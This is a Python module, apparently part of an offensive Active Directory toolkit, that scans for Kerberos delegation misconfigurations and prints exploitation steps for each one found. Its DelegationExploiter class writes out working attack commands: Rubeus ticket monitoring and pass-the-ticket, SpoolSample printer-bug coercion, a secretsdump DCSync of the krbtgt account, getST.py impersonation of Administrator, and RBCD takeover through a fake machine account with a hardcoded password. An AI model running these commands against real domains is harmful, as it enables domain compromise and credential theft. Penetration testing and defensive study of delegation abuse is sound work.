#!/usr/bin/env python3
"""
Kerberos Delegation Abuse - Privilege Escalation via Delegation Attacks

Implements Kerberos delegation exploitation:
- Unconstrained Delegation Detection
- Constrained Delegation Abuse (S4U2Self/S4U2Proxy)
- Resource-Based Constrained Delegation (RBCD)
- Computer Account Takeover

Integrates with Rubeus and Impacket for ticket manipulation.
"""

import sys
import os
import argparse
import subprocess
import json
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Vulnerability
from core.logger import setup_logger, get_logger

logger = None

class KerberosDelegationScanner:
    """Scans for Kerberos delegation misconfigurations"""
    
    def __init__(self, domain, dc_ip, username, password=None):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.vulnerabilities = []
    
    def scan_unconstrained_delegation(self):
        """Find computers with unconstrained delegation"""
        logger.info("Scanning for unconstrained delegation...")
        
        # LDAP query for userAccountControl with TRUSTED_FOR_DELEGATION flag
        ldap_filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
        
        try:
            # Use ldapsearch or PowerView
            results = self._ldap_query(ldap_filter, attributes=['cn', 'dNSHostName'])
            
            if results:
                logger.warning(f"Found {len(results)} computers with unconstrained delegation!")
                
                for result in results:
                    vuln = {
                        'name': f'Unconstrained Delegation: {result.get("cn", "Unknown")}',
                        'severity': 'Critical',
                        'description': f'Computer {result.get("dNSHostName", "Unknown")} has unconstrained delegation enabled',
                        'computer': result.get('dNSHostName', ''),
                        'attack': 'printer_bug',
                        'cve': 'N/A'
                    }
                    self.vulnerabilities.append(vuln)
                    logger.warning(f"  {result.get('dNSHostName', 'Unknown')}")
            else:
                logger.info("No unconstrained delegation found")
        
        except Exception as e:
            logger.error(f"Unconstrained delegation scan failed: {e}")
        
        return [v for v in self.vulnerabilities if 'Unconstrained' in v['name']]
    
    def scan_constrained_delegation(self):
        """Find accounts with constrained delegation"""
        logger.info("Scanning for constrained delegation...")
        
        # LDAP query for msDS-AllowedToDelegateTo attribute
        ldap_filter = "(msDS-AllowedToDelegateTo=*)"
        
        try:
            results = self._ldap_query(
                ldap_filter,
                attributes=['cn', 'msDS-AllowedToDelegateTo', 'objectClass']
            )
            
            if results:
                logger.warning(f"Found {len(results)} accounts with constrained delegation!")
                
                for result in results:
                    target_spns = result.get('msDS-AllowedToDelegateTo', [])
                    if isinstance(target_spns, str):
                        target_spns = [target_spns]
                    
                    vuln = {
                        'name': f'Constrained Delegation: {result.get("cn", "Unknown")}',
                        'severity': 'High',
                        'description': f'Account can delegate to: {", ".join(target_spns)}',
                        'account': result.get('cn', ''),
                        'target_spns': target_spns,
                        'attack': 's4u2proxy',
                        'cve': 'N/A'
                    }
                    self.vulnerabilities.append(vuln)
                    logger.warning(f"  {result.get('cn', '')}: {target_spns}")
            else:
                logger.info("No constrained delegation found")
        
        except Exception as e:
            logger.error(f"Constrained delegation scan failed: {e}")
        
        return [v for v in self.vulnerabilities if 'Constrained' in v['name']]
    
    def scan_rbcd(self):
        """Find computers vulnerable to Resource-Based Constrained Delegation"""
        logger.info("Scanning for RBCD opportunities...")
        
        # Query for msDS-AllowedToActOnBehalfOfOtherIdentity
        ldap_filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
        
        try:
            results = self._ldap_query(
                ldap_filter,
                attributes=['cn', 'dNSHostName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']
            )
            
            if results:
                logger.warning(f"Found {len(results)} computers with RBCD configured!")
                
                for result in results:
                    vuln = {
                        'name': f'RBCD Enabled: {result.get("cn", "Unknown")}',
                        'severity': 'High',
                        'description': 'Resource-Based Constrained Delegation is configured',
                        'computer': result.get('dNSHostName', ''),
                        'attack': 'rbcd_takeover',
                        'cve': 'N/A'
                    }
                    self.vulnerabilities.append(vuln)
            else:
                logger.info("No RBCD configurations found")
        
        except Exception as e:
            logger.error(f"RBCD scan failed: {e}")
        
        return [v for v in self.vulnerabilities if 'RBCD' in v['name']]
    
    def _ldap_query(self, ldap_filter, attributes):
        """Execute LDAP query against domain controller"""
        # Use ldapsearch or python-ldap
        cmd = [
            "ldapsearch",
            "-x",
            "-h", self.dc_ip,
            "-D", f"{self.username}@{self.domain}",
            "-w", self.password or "",
            "-b", f"DC={self.domain.replace('.', ',DC=')}",
            ldap_filter
        ]
        cmd.extend(attributes)
        
        try:
            # Simulated - would actually execute ldapsearch
            # result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            # return parse_ldap_output(result.stdout)
            return []
        except Exception as e:
            logger.debug(f"LDAP query failed: {e}")
            return []


class DelegationExploiter:
    """Exploits Kerberos delegation misconfigurations"""
    
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def exploit_unconstrained_delegation(self, target_computer):
        """
        Exploit unconstrained delegation via Printer Bug
        
        Technique: Force authentication from DC to compromised computer,
        capture TGT, then perform DCSync
        """
        logger.info(f"Exploiting unconstrained delegation on {target_computer}...")
        
        # Step 1: Monitor for incoming TGTs (Rubeus)
        monitor_cmd = f"Rubeus.exe monitor /interval:5 /nowrap"
        
        # Step 2: Trigger authentication (SpoolSample/PrinterBug)
        trigger_cmd = f"SpoolSample.exe {self.dc_ip} {target_computer}"
        
        # Step 3: Extract TGT and perform pass-the-ticket
        ptt_cmd = "Rubeus.exe ptt /ticket:<base64_ticket>"
        
        # Step 4: DCSync
        dcsync_cmd = f"secretsdump.py '{self.domain}/{self.username}@{self.dc_ip}' -just-dc-user krbtgt"
        
        exploitation_guide = {
            'steps': [
                {'step': 1, 'command': monitor_cmd, 'description': 'Monitor for TGTs'},
                {'step': 2, 'command': trigger_cmd, 'description': 'Trigger authentication'},
                {'step': 3, 'command': ptt_cmd, 'description': 'Pass-the-ticket'},
                {'step': 4, 'command': dcsync_cmd, 'description': 'DCSync attack'}
            ]
        }
        
        logger.info("Unconstrained delegation exploitation steps:")
        for step in exploitation_guide['steps']:
            logger.info(f"  Step {step['step']}: {step['description']}")
            logger.info(f"    {step['command']}")
        
        return exploitation_guide
    
    def exploit_constrained_delegation(self, delegating_account, target_spn):
        """
        Exploit constrained delegation via S4U2Self + S4U2Proxy
        
        Obtain service ticket to any user on allowed SPN
        """
        logger.info(f"Exploiting constrained delegation: {delegating_account} -> {target_spn}")
        
        # Use Rubeus or Impacket's getST.py
        exploit_cmd = f"""
        getST.py -spn {target_spn} -impersonate Administrator '{self.domain}/{delegating_account}:{self.password}'
        """
        
        logger.info("Constrained delegation exploitation:")
        logger.info(f"  Command: {exploit_cmd.strip()}")
        logger.info(f"  Result: Service ticket for Administrator@{target_spn}")
        
        return {'command': exploit_cmd.strip(), 'target': target_spn}
    
    def exploit_rbcd(self, target_computer):
        """
        Exploit RBCD by adding our controlled computer to delegation rights
        """
        logger.info(f"Exploiting RBCD on {target_computer}...")
        
        # Steps:
        # 1. Create computer account
        # 2. Modify msDS-AllowedToActOnBehalfOfOtherIdentity
        # 3. S4U2Self + S4U2Proxy to get ticket
        
        steps = [
            "addcomputer.py -computer-name 'FAKE$' -computer-pass 'Password123' '{domain}/{username}:{password}'",
            "rbcd.py -delegate-from 'FAKE$' -delegate-to '{target}' -action write '{domain}/{username}:{password}'",
            "getST.py -spn cifs/{target} -impersonate Administrator '{domain}/FAKE$:Password123'"
        ]
        
        logger.info("RBCD exploitation steps:")
        for i, step in enumerate(steps, 1):
            logger.info(f"  {i}. {step}")
        
        return {'steps': steps}


def main(session_dir, domain, dc_ip, username, password=None):
    """Main Kerberos delegation abuse flow"""
    global logger
    
    setup_logger("kerberos_delegation", session_dir)
    logger = get_logger("kerberos_delegation")
    
    logger.info("=" * 60)
    logger.info("Kerberos Delegation Abuse Scanner")
    logger.info("=" * 60)
    logger.info(f"Domain: {domain}")
    logger.info(f"DC: {dc_ip}")
    
    # Initialize database
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    # Get DC target
    session = db.get_session()
    target = session.query(db.Target).filter_by(ip_address=dc_ip).first()
    session.close()
    
    if not target:
        target = db.add_target(ip=dc_ip, is_dc=True, domain=domain)
    
    # Initialize scanner
    scanner = KerberosDelegationScanner(domain, dc_ip, username, password)
    
    # Scan for delegation issues
    logger.info("\n[1/3] Scanning for unconstrained delegation...")
    unconstrained = scanner.scan_unconstrained_delegation()
    
    logger.info("\n[2/3] Scanning for constrained delegation...")
    constrained = scanner.scan_constrained_delegation()
    
    logger.info("\n[3/3] Scanning for RBCD configurations...")
    rbcd = scanner.scan_rbcd()
    
    # Save vulnerabilities
    all_vulns = scanner.vulnerabilities
    logger.info(f"\nFound {len(all_vulns)} delegation vulnerability/vulnerabilities")
    
    for vuln in all_vulns:
        session = db.get_session()
        vuln_obj = Vulnerability(
            target_id=target.id,
            name=vuln['name'],
            severity=vuln['severity'],
            description=vuln['description'],
            cve_id=vuln.get('cve', 'N/A')
        )
        session.add(vuln_obj)
        session.commit()
        session.close()
        
        logger.info(f"  [{vuln['severity']}] {vuln['name']}")
    
    # Generate exploitation guides
    if all_vulns:
        logger.info("\nGenerating exploitation guides...")
        exploiter = DelegationExploiter(domain, dc_ip, username, password)
        
        for vuln in all_vulns:
            if vuln['attack'] == 'printer_bug':
                exploiter.exploit_unconstrained_delegation(vuln['computer'])
            elif vuln['attack'] == 's4u2proxy':
                if vuln['target_spns']:
                    exploiter.exploit_constrained_delegation(vuln['account'], vuln['target_spns'][0])
            elif vuln['attack'] == 'rbcd_takeover':
                exploiter.exploit_rbcd(vuln['computer'])
    
    logger.info("\nKerberos delegation scan complete")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Kerberos Delegation Abuse - Privilege Escalation"
    )
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    
    args = parser.parse_args()
    
    main(args.session_dir, args.domain, args.dc_ip, args.username, args.password)
